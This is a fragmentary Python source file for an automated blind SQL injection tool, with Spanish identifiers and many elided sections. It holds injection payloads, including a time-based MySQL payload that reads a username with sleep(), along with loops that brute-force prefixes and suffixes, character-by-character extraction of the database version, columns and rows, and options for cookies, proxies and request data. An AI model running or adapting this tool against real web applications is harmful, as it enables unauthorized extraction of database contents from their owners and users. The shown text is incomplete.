...
#		'version':["'and IF(ascii(substring((SELECT username from user where id = 1),1,1))>1,sleep(10),0)=0-- -+" , "'" , "and   IF(ascii(substring(@@version," , "))" , ",sleep(1),0)=0","-- -+"],
	...
	def setError(self,error):
		...
		self.error = error
		self.errorT = True
		print "Error String: "+self.error

	def setSuccess(self,success):
		#self.cookie.update({""})
		self.success = success
		
		print "success String: "+self.success
				...
				for querys in obj.PayloadsAttempt[manejadores]:
					for pref in obj.Prefijos:
						for suf in obj.Sufijos[manejadores]:
							...
							#print not obj.error in consulta2.text
							# if obj.success in consulta2.text:
							# 	print "Success in consulta"+str(obj.success in consulta2.text and (len(obj.success)>0))
							# if obj.error in consulta2.text:
							# 	print "error in consulta"+str(obj.error in consulta2.text)
							#print "Error in consulta"+str(obj.error in consulta2.text)
							isSuccess = False
							if (len(obj.success)>0):
								isSuccess = obj.success in consulta2.text
							#print "issuccess:"+str(isSuccess)
							#print "not error in consulta:"+ str(not obj.error in consulta2.text)
							#print "c1==c2:"+str(consulta.text == consulta2.text)
							if consulta.text == consulta2.text or not obj.error in consulta2.text or isSuccess:
								obj.pref = pref
								obj.suf = suf
								obj.manejador = manejadores
								print "!"+pref +querys+ suf+"!"
								#print manejadores
	...
	def busqueda(obj,manejador,tipo,ok,up,down,fila,columna,where,based):
		...
		if based == "error":
			...
			if tipo == "ve2rsion":
				...
				#print consulta.text
				#print "1: "
				#print not obj.error in consulta.text
			isSuccess = False
			if (len(obj.success)>0):
				isSuccess = obj.success in consulta2.text
			# print consulta.text == ok 
			# print "cons:"+consulta.text
			# print "ok:"+ok	
			# print not obj.error in consulta.text 
			# print isSuccess
			# print (consulta.text != ok or  obj.error in consulta.text or not obj.success in consulta.text) and (up == down )
			if consulta.text == ok or not obj.error in consulta.text or isSuccess:
				return caracter

			#if len(error) !=0 and up == down:
				...
				if tipo == "ve2rsion":
					print direccion.replace("_cond_",">"+str(ord(caracter))+obj.suf)
					#print direccion
					#print consulta2.text
					#print "3: "
					#print obj.error+"          "+consulta2.text
					#print not obj.error in consulta2.text
	...
	def getVersion(obj,manejador,tipo,ok,up,down,fila,columna,where,based):
		...
		while char != "No encontrado":
		 	...
		 	if indiceY >= lim and (var == "Y" or var == "y") and indiceY%150 == 0:
		 		...
		 		# print "Cadena de versión demasiado larga ("+str(len)+")!"
		 		# if len(obj.success)>0:
		 		# 	var = raw_input( "Seguro que tu cadena de éxito es correcta?")
		 		# elif len(obj.error)>0:
		 		# 	var = raw_input( "Seguro que tu cadena de error es correcta?")

		 		# while var != "Y" and var != "y" and var != "n" and var != "N":
		 		# 	var = raw_input( "Deseas continuar:[Y/n]")
		 		# 	print var
		 		...
		 		# 	exit(2)
		 		# if indiceY%150 == 0 and (var != "Y" or var != "y"):
		 		# 	lim = indiceY
	...
	def getColumnas(obj,manejador,tipo,ok,up,down,fila,columna,where,based,bases,current,version):
		...
		obj.Filename = "report/"+obj.server+"datos"+str(datetime.now())+"--"+tipo
	...
	def getInfo(obj,manejador,tipo,ok,up,down,fila,columnas,where,based,bases,current,table,columna,f,columna1):
		...
		#print pagCont.text
		# print "1:"
		# print obj.error in count.text
		# print "2:"
		# print count.text != pagCont.text
		print "lol1"
		if tipo == "mysql" and obj.based == "error":
			...
			while ((count.text != pagCont.text) ^ (len(obj.error)>0 or len(obj.success)>0)) or  (len(obj.error)>0 and obj.error in count.text) or (len(obj.success)> 0 and not obj.success in count.text):
				# print "1 "+str(count.text != pagCont.text or  (len(obj.error)>0 and obj.error in count.text) or (len(obj.success)> 0 and not obj.success in count.text))
				# print "2 "+ str((len(obj.error)>0 and obj.error in count.text))
				# print "3 "+str((len(obj.success)> 0 and not obj.success in count.text))
				if not "_sqli_" in obj.server:
...
def Opciones(argv):
	try:
		opciones, argumentos = getopt(argv[1:],"h:v",["v","request=","cookies=","user-agent=","method=","random-agent=","data=","proxy=","based=","time=","error=","success="])
	except GetoptError:
